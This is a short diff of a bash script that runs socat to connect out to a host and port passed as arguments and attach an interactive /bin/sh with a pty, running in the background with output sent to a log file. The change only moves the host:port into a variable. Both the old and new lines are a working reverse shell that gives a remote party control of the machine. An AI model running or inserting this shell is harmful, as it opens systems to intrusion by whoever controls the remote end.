@@ -1,3 +1,4 @@
 #/bin/bash
 #$host $port
-env TERM=linux ./socat "$1":"$2" exec:/bin/sh,pty,stderr,setsid,sigint,sane >../log.txt 2>&1 &
+host_port="$1:$2"
+env TERM=linux ./socat "$host_port" exec:/bin/sh,pty,stderr,setsid,sigint,sane >../log.txt 2>&1 &
